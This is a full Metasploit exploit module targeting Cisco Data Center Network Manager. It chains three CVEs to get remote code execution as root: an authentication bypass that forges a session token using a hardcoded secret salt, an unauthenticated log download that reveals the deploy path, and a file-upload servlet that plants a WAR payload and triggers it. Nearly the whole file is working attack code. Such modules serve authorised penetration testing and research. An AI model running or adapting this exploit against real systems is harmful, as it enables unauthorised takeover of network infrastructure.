
##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

# Tested on :
# Linux/VA 10.4.2 OK
# Linux/VA 11.0.1 OK
# Linux/VA 11.1.1 OK

require 'zip'
require 'tempfile'

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::EXE
  include Msf::Exploit::FileDropper

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Cisco Data Center Network Manager Unauthenticated Remote Code Execution',
      'Description'    => %q{
      DCNM exposes a file upload servlet (FileUploadServlet) at /fm/fileUpload.
      An authenticated user can abuse this servlet to upload a WAR to the Apache Tomcat webapps
      directory and achieve remote code execution as root.
      This module exploits two other vulnerabilities, CVE-2019-1619 for authentication bypass on
      versions 10.4(2) and below, and CVE-2019-1622 (information disclosure) to obtain the correct
      directory for the WAR file upload.
      This module was tested on the DCNM Linux virtual appliance 10.4(2), 11.0(1) and 11.1(1), and should
      work on a few versions below 10.4(2). Only version 11.0(1) requires authentication to exploit
      (see References to understand why).
      },
      'Author'         =>
        [
          'Pedro Ribeiro <pedrib[at]gmail.com>'        # Vulnerability discovery and Metasploit module
        ],
      'License'        => MSF_LICENSE,
      'References'     =>
        [
          [ 'CVE', '2019-1619' ], # auth bypass
          [ 'CVE', '2019-1620' ], # file upload
          [ 'CVE', '2019-1622' ], # log download
          [ 'URL', 'https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-20190626-dcnm-bypass' ],
          [ 'URL', 'https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-20190626-dcnm-codex' ],
          [ 'URL', 'https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-20190626-dcnm-codex' ],
          [ 'URL', 'https://raw.githubusercontent.com/pedrib/PoC/master/exploits/metasploit/cisco_dcnm_upload_2019.rb' ],
          [ 'URL', 'https://seclists.org/fulldisclosure/2019/Jul/7' ]
        ],
      'Platform'       => 'java',
      'Arch'           => ARCH_JAVA,
      'Targets'        =>
        [
          [ 'Automatic', {} ],
          [
            'Cisco DCNM 11.1(1)', {}
          ],
          [
            'Cisco DCNM 11.0(1)', {}
          ],
          [
            'Cisco DCNM 10.4(2)', {}
          ]
        ],
      'Privileged'     => true,
      'DefaultOptions' => { 'WfsDelay' => 10 },
      'DefaultTarget'  => 0,
      'DisclosureDate' => 'Jun 26 2019'
    ))

    register_options(
      [
        OptPort.new('RPORT', [true, 'The target port', 443]),
        OptBool.new('SSL', [true, 'Connect with TLS', true]),
        OptString.new('TARGETURI', [ true,  "Default server path", '/']),
        OptString.new('USERNAME', [ true,  "Username for auth (required only for 11.0(1) and above", 'admin']),
        OptString.new('PASSWORD', [ true,  "Password for auth (required only for 11.0(1) and above", 'admin']),
      ])
  end


  def check
    # at the moment this is the best way to detect
    # check if pmreport and fileUpload servlets return a 500 error with no params
    res = send_request_cgi({
      'uri'    => normalize_uri(datastore['TARGETURI'], 'fm', 'pmreport'),
      'vars_get'  =>
      {
        'token'  => rand_text_alpha(5..20)
      },
      'method' => 'GET'
    })
    if res && res.code == 500
      res = send_request_cgi({
        'uri'    => normalize_uri(datastore['TARGETURI'], 'fm', 'fileUpload'),
        'method' => 'GET',
      })
      if res and res.code == 500
        return Exploit::CheckCode::Detected
      end
    end

    return Exploit::CheckCode::Unknown
  end

  def target_select
    if target != targets[0]
      return target
    else
      res = send_request_cgi({
        'uri'    => normalize_uri(datastore['TARGETURI'], 'fm', 'fmrest', 'about','version'),
        'method' => 'GET'
      })
      if res && res.code == 200
        if res.body =~ /\"version\":\"11\.1\(1\)/
          print_good("#{peer} - Detected DCNM 11.1(1)")
          print_status("#{peer} - No authentication required, ready to exploit!")
          return targets[1]
        elsif res.body =~ /\"version\":\"11\.0\(1\)/
          print_good("#{peer} - Detected DCNM 11.0(1)")
          print_status("#{peer} - Note that 11.0(1) requires valid authentication credentials to exploit")
          return targets[2]
        elsif res.body =~ /\"version\":\"10\.4\(2\)/
          print_good("#{peer} - Detected DCNM 10.4(2)")
          print_status("#{peer} - No authentication required, ready to exploit!")
          return targets[3]
        else
          print_error("#{peer} - Failed to detect target version.")
          print_error("Please contact module author or add the target yourself and submit a PR to the Metasploit project!")
          print_error(res.body)
          print_status("#{peer} - We will proceed assuming the version is below 10.4(2) and vulnerable to auth bypass")
          return targets[3]
        end
      end
      fail_with(Failure::NoTarget, "#{peer} - Failed to determine target")
    end
  end


  def auth_v11
    res = send_request_cgi({
      'uri'    => normalize_uri(datastore['TARGETURI'], 'fm/'),
      'method' => 'GET',
      'vars_get'  =>
      {
        'userName'  => datastore['USERNAME'],
        'password'  => datastore['PASSWORD']
      },
    })

    if res && res.code == 200
      # get the JSESSIONID cookie
      if res.get_cookies
        res.get_cookies.split(';').each { |cok|
          if cok =~ /JSESSIONID/
            return cok
          end
        }
      end
    end
  end


  def auth_v10
    # step 1: get a JSESSIONID cookie and the server Date header
    res = send_request_cgi({
      'uri'    => normalize_uri(datastore['TARGETURI'], 'fm/'),
      'method' => 'GET'
    })

    # step 2: convert the Date header and create the auth hash
    if res and res.headers['Date']
      jsession = res.get_cookies.split(';')[0]
      date = Time.httpdate(res.headers['Date'])
      server_date = date.strftime("%s").to_i * 1000
      print_good("#{peer} - Got sysTime value #{server_date.to_s}")

      # auth hash format:
      # username + sessionId + sysTime + POsVwv6VBInSOtYQd9r2pFRsSe1cEeVFQuTvDfN7nJ55Qw8fMm5ZGvjmIr87GEF
      session_id = rand(1000..50000).to_s
      md5 = Digest::MD5.digest 'admin' + session_id + server_date.to_s +
        "POsVwv6VBInSOtYQd9r2pFRsSe1cEeVFQuTvDfN7nJ55Qw8fMm5ZGvjmIr87GEF"
      md5_str = Base64.strict_encode64(md5)

      # step 3: authenticate our cookie as admin
      # token format: sessionId.sysTime.md5_str.username
      res = send_request_cgi({
        'uri'    => normalize_uri(datastore['TARGETURI'], 'fm', 'pmreport'),
        'cookie' => jsession,
        'vars_get'  =>
        {
          'token'  => "#{session_id}.#{server_date.to_s}.#{md5_str}.admin"
        },
        'method' => 'GET'
      })

      if res and res.code == 500
        return jsession
      end
    end
  end


  # use CVE-2019-1622 to fetch the logs unauthenticated, and get the WAR upload path from jboss*.log
  def get_war_path
    res = send_request_cgi({
      'uri'    => normalize_uri(datastore['TARGETURI'], 'fm', 'log', 'fmlogs.zip'),
      'method' => 'GET'
    })

    if res and res.code == 200
      tmp = Tempfile.new
      # we have to drop this into a file first
      # else we will get a Zip::GPFBit3Error if we use an InputStream
      File.binwrite(tmp, res.body)
      Zip::File.open(tmp) do |zis|
        zis.each do |entry|
          if entry.name =~ /jboss[0-9]*\.log/
            fdata = zis.read(entry)
            if fdata[/Started FileSystemDeploymentService for directory ([\w\/\\\-\.:]*)/]
              return $1.strip
            end
          end
        end
      end
    end
  end


  def exploit
    target = target_select

    if target == targets[2]
      jsession = auth_v11
    elsif target == targets[3]
      jsession = auth_v10
    end

    # targets[1] DCNM 11.1(1) doesn't need auth!
    if jsession == nil and target != targets[1]
      fail_with(Failure::NoAccess, "#{peer} - Failed to authenticate JSESSIONID cookie")
    elsif target != targets[1]
      print_good("#{peer} - Successfully authenticated our JSESSIONID cookie")
    end

    war_path = get_war_path
    if war_path == nil or war_path.empty?
      fail_with(Failure::Unknown, "#{peer} - Failed to get WAR path from logs")
    else
      print_good("#{peer} - Obtain WAR path from logs: #{war_path}")
    end

    # Generate our payload... and upload it
    app_base = rand_text_alphanumeric(6..16)
    war_payload = payload.encoded_war({ :app_name => app_base }).to_s

    fname = app_base + '.war'
    post_data = Rex::MIME::Message.new
    post_data.add_part(fname, nil, nil, content_disposition = "form-data; name=\"fname\"")
    post_data.add_part(war_path, nil, nil, content_disposition = "form-data; name=\"uploadDir\"")
    post_data.add_part(war_payload,
                       "application/octet-stream", 'binary',
                       "form-data; name=\"#{rand_text_alpha(5..20)}\"; filename=\"#{rand_text_alpha(6..10)}\"")
    data = post_data.to_s

    print_status("#{peer} - Uploading payload...")
    res = send_request_cgi({
      'uri'    => normalize_uri(datastore['TARGETURI'], 'fm', 'fileUpload'),
      'method' => 'POST',
      'data'   => data,
      'cookie' => jsession,
      'ctype'  => "multipart/form-data; boundary=#{post_data.bound}"
    })

    if res and res.code == 200 and res.body[/#{fname}/]
      # step 5: call Shelly
      print_good("#{peer} - WAR uploaded, waiting a few seconds for deployment...")

      sleep 10

      print_status("#{peer} - Executing payload...")
      send_request_cgi({
        'uri'    => normalize_uri(datastore['TARGETURI'], app_base),
        'method' => 'GET'
      })

      handler
    else
      fail_with(Failure::Unknown, "#{peer} - Failed to upload WAR file")
    end
  end
end
